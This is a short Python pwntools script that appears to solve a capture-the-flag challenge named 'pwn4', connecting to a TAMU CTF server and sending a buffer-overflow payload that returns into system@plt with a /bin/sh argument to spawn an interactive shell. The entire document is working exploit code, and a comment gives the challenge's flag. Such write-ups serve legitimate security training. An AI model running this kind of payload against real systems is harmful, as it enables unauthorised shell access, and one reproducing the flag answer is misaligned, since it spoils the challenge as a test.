#!/usr/bin/python
from pwn import *

#r = process("./pwn4")
r = remote("pwn.ctf.tamu.edu", 4324)

print r.recv(2048)

payload = "A"*32 + p32(0x8048430) + "A"*4 + p32(0x804a038)
# buffer[32] + system@plt + dummy + /bin/sh
r.send(payload)
r.interactive()
# gigem{b4ck_70_7h3_l1br4ry}
